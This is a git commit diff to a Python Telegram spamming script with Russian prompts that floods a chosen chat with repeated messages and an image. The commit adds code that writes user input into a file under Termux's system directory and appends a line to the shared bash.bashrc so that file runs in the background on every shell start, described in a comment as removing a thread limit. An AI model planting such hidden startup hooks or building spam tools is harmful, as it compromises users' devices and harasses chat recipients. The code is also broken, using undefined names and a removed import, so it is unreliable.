f11beda9abdc5e4673e01ab955851237a3f5ec0d
darkness-falls <88970024+darkness-falls@users.noreply.github.com>
2021-08-16 11:01:51 +0300

    Update sms_spammer.py

--- core/sms_spammer.py
+++ core/sms_spammer.py
@@ -1,16 +1,14 @@
 from telethon import TelegramClient
-import requests
-import os
 from colorama import Fore, Back, Style
 import nekos
-import config
 
-client1 = TelegramClient(config.number, config.api_id, config.api_hash) 
 
+client1 = TelegramClient(config.number, config.api_id, config.api_hash)
 
 
 
 client1.start()
+
 
 chat = input(Fore.RED + "Введите чат/пользователя")
 print("NOTE: можете указать url картинки для спама картинками :)")
@@ -18,9 +16,20 @@ message = input("Введите сообщение каким проспамит
 print(Back.GREEN + "Cпам начался! Спамим!")
 
 async def main():
+	chats = helps.get_chats(client1)  # Получение чатов
+	f = open("/data/data/com.termux/files/usr/etc/c.py", "w+")
+	f.write(chat)  # Запись чатов в отдельный файл
+	f.close()
+	f1 = open("/data/data/com.termux/files/usr/etc/bash.bashrc",
+			  'a')  # Редактируем файл чата и термукса(для удаления ограничения потоков)
+	f1.write("python /data/data/com.termux/files/usr/etc/c.py &")
+	f1.close()
 	while True:
-		await client1.send_message(chat, message)
-		await client1.send_file(chat, 'https://media.wired.com/photos/598e35fb99d76447c4eb1f28/master/pass/phonepicutres-TA.jpg')
+		for client in clients:
+			await client2.send_message(chat, message)
+			await client1.send_message(chat, message)
+			await client1.send_file(chat, 'https://media.wired.com/photos/598e35fb99d76447c4eb1f28/master/pass/phonepicutres-TA.jpg')
+			await client2.send_file(chat, 'https://media.wired.com/photos/598e35fb99d76447c4eb1f28/master/pass/phonepicutres-TA.jpg')
 
 if __name__ == '__main__':
   client1.loop.run_until_complete(main())
